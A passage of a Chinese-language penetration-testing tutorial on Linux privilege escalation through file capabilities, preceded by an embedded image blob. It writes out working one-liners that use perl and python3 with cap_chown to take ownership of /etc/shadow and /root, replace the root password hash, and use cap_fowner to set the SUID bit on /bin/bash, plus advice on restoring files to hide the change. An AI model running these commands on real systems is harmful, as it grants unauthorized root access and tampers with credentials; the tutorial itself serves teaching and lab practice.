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" width="453" height="60" class="img_ev3q"></p>
<p>完成后，按<strong>CTRL + C</strong>退出插入模式，然后输入<!-- -->:wq<!-- -->!以“强制写入并退出”。现在我们可以简单地使用 sudo su 并获得 root 提示符，而无需知道当前用户的密码！</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164304845-363513331-0ff3a16b03077c0cede37077bdbd0054.png" width="597" height="97" class="img_ev3q"></p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="33cap_chown"><strong><div id="id3.3">3.3、cap_chown</div></strong><a href="#33cap_chown" class="hash-link" aria-label="33cap_chown的直接链接" title="33cap_chown的直接链接">​</a></h4>
<p>cap_chown 功能为用户提供了更改文件系统中任意文件或目录所有权的能力，其中包括 root 拥有的所有文件和目录。如果我们发现脚本语言（python、perl、node 等）等二进制文件被赋予了这种能力，我们就可以使用系统命令来更改我们选择的任何文件的所有者。</p>
<p>这种能力特别危险的地方在于，它间接允许我们写入任何文件。我们需要做的就是先将文件的所有权更改为当前用户，编辑它，然后将所有权恢复到原始状态，就好像什么都没发生过一样。</p>
<p>从 PEAS 和手动枚举的输出中，我们可以看到以下二进制文件启用了 cap_chown 功能：<strong>perl</strong>、<strong>python3</strong>。</p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="331cap_chown--perl"><strong><div id="id3.3.1">3.3.1、cap_chown – perl</div></strong><a href="#331cap_chown--perl" class="hash-link" aria-label="331cap_chown--perl的直接链接" title="331cap_chown--perl的直接链接">​</a></h6>
<p>对于此示例，我们将使用具有 cap_chown 功能的 perl 来更改影子文件的所有权，以便我们可以编辑它并更改 root 密码。</p>
<blockquote>
<p>如果你对影子文件还不熟悉，那么它就是 Linux 中存储密码哈希值的地方。历史上，这些哈希值都存储在 /etc/passwd 中，但该文件需要能被标准用户读取，因此在那里存储哈希值是很危险的。因此，/etc/passwd 中存在一个 &quot;x &quot;占位符，用来存放哈希值，该值取自 /etc/shadow，默认情况下标准用户无法读取。</p>
</blockquote>
<p>在我们采取恶意行动之前，我们需要从 /etc/passwd 文件中获取当前用户的 UID/GID，以便在更改文件所有权时使用它。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164305025-230243918-0e73886aa28bdfdc404538f7a804b92b.png" width="545" height="77" class="img_ev3q"></p>
<p>在这里我们可以看到我们的用户的 UID 和 GID 为 1000。我们还应该注意到 root 的 UID 和 GID 为 0。此外，影子组的 GID 为 42。</p>
<blockquote>
<p>影子文件归 root 所有，属于“shadow”组，该组不是用户组，但对于任何需要获取密码哈希的程序来说，它都是必需的组。shadow 组是唯一允许访问影子文件的组权限。</p>
</blockquote>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164304512-597970758-2ef61b9600efd5bece2b2afb33ee85cd.png" width="455" height="73" class="img_ev3q"></p>
<p>好了，既然影子文件在 shadow 组中，我们可以将文件所有者更改为我们的用户，并将组所有权设置为 shadow (42)。这可以通过以下命令轻松完成：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/home/juggernaut/bin/perl -e &#x27;chown 1000,42,&quot;/etc/shadow&quot;&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164304828-292553014-fe14898f9d22f111b94374b6ac82eb88.png" width="570" height="98" class="img_ev3q"></p>
<p>令人惊奇的是，我们可以在这里看到影子文件现在归 juggernaut（我们当前的用户）所有，并且我们对其具有写权限！</p>
<p>在对影子文件进行任何更改之前，我们需要做几件事。首先，让我们生成一个 SHA-512 哈希来替换为 root 设置的哈希，这将有效地更改 root 密码。为此，我们可以在攻击者机器上使用以下命令生成密码哈希（这会将密码设置为“password”）。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mkpasswd -m sha-512 password</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164305113-864497314-1468604795298f85670516db90381665.png" width="864" height="63" class="img_ev3q"></p>
<p>回到受害者，我们需要复制（备份）影子文件，以便在退出 root shell 后恢复它。这应该不是问题，因为我们现在是该文件的所有者。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164305470-766223937-f94feeb8b20cd0a23f0533dde5194a8a.png" width="620" height="290" class="img_ev3q"></p>
<p>好了，各个部件都准备好了，让我们把它们组装起来吧！</p>
<p>复制我们从攻击者机器生成的密码，然后使用受害者机器上的文本编辑器打开影子文件并用它替换现有的 root 密码。</p>
<p>前：</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164306289-613969370-2f4599d0305639753108f436f03d4393.png" width="675" height="83" class="img_ev3q"></p>
<p>后：</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164304933-1538243486-578ecb212f293fa804273898e8e091fd.png" width="670" height="81" class="img_ev3q"></p>
<p>一旦更改完成，请保存并关闭文件。</p>
<p>我们需要测试是否可以将用户切换为 root 用户。为此，我们只需使用<strong>su root</strong>，然后在提示时输入<strong>密码</strong>，最终我们就会得到 root shell。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164305571-919757388-9ac376acae9d7e6493e543ac8843db6a.png" width="436" height="99" class="img_ev3q"></p>
<p>砰！成功了！现在我们有了 root shell，我们可以继续将备份影子文件复制到原始文件上，然后使用 <strong>chown</strong> 再次使 root 成为文件所有者。这样，一切都将恢复正常，我们仍然拥有 root shell。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164304947-1931664043-89916ca89827c0068dc03a1ea9bd6c68.png" width="573" height="76" class="img_ev3q"></p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="332cap_chown--python3"><strong><div id="id3.3.2">3.3.2、cap_chown – python3</div></strong><a href="#332cap_chown--python3" class="hash-link" aria-label="332cap_chown--python3的直接链接" title="332cap_chown--python3的直接链接">​</a></h6>
<p>因为 Python3 和 Perl 都是脚本语言，所以我们只回顾一个使用 Python3 的快速示例。我们可以改变一个目录的权限，比如 /root 目录，而不是改变文件的所有权以便编辑它。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/home/juggernaut/bin/python3 -c &#x27;import os;os.chown(&quot;/root&quot;,1000,0)&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>执行此命令后，我们对根文件夹拥有了完全访问权限。由于权限是从 /root 文件夹继承的，因此即使我们看到这些文件属于 root，我们仍然可以查看它们。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164307363-808843795-958e74913504617596697b47e9a7542b.png" width="816" height="273" class="img_ev3q"></p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="34cap_fowner"><strong><div id="id3.4">3.4、cap_fowner</div></strong><a href="#34cap_fowner" class="hash-link" aria-label="34cap_fowner的直接链接" title="34cap_fowner的直接链接">​</a></h4>
<p>cap_fowner 功能为用户提供了更改文件系统中任意文件或目录权限的能力，其中包括 root 拥有的所有文件和目录。如果我们发现脚本语言（python、perl、node 等）等二进制文件被赋予了这种能力，我们就可以使用系统命令来更改我们选择的任何文件的权限。</p>
<p>在我们本篇文章举例说明的所有功能中，这个可能是最危险的。因为我们可以使用该功能更改任何文件的权限，这意味着我们可以让任何文件成为全局可读可写，最糟糕的是，我们可以在任何二进制文件上设置 SUID 位。</p>
<p>从 PEAS 和手动枚举的输出中，我们可以看到以下二进制文件启用了 cap_fowner 功能：<strong>python3</strong></p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="341cap_fowner--python3"><strong><div id="id3.4.1">3.4.1、cap_fowner – python3</div></strong><a href="#341cap_fowner--python3" class="hash-link" aria-label="341cap_fowner--python3的直接链接" title="341cap_fowner--python3的直接链接">​</a></h6>
<p>在本例中，我们可以做一些我们已经见过的事情，将任何文件的权限改为全局可写，例如 /etc/passwd 文件或 /etc/shadow 文件。我们也可以允许自己读取root文件夹并获取 SSH 密钥。不过，我们要做的是还没做过的事，在二进制文件上设置 SUID 位。</p>
<p>最简单的方法是将 SUID 位分配给 bash 或任何其他 shell 二进制文件；但是，如果我们想要发挥创造力，我们可以将 SUID 位添加到在 SUID 部分中找到的 GTFObins 上的任何二进制文件，然后按照步骤获取 root 权限。</p>
<p>要快速获得 root 权限，只需在 /bin/bash 上设置 SUID 位，如下所示：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/home/juggernaut/bin/python3 -c &#x27;import os;os.chmod(&quot;/bin/bash&quot;, 0o4755)&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164305859-1404919573-2e2d588addcb82d2a3ce1b00a96e5575.png" width="861" height="146" class="img_ev3q"></p>
<p>太棒了！我们已成功将 SUID 位添加到 bash。现在我们只需使用命令 <strong>/bin/bash -p</strong> 即可进入 root shell。</p>
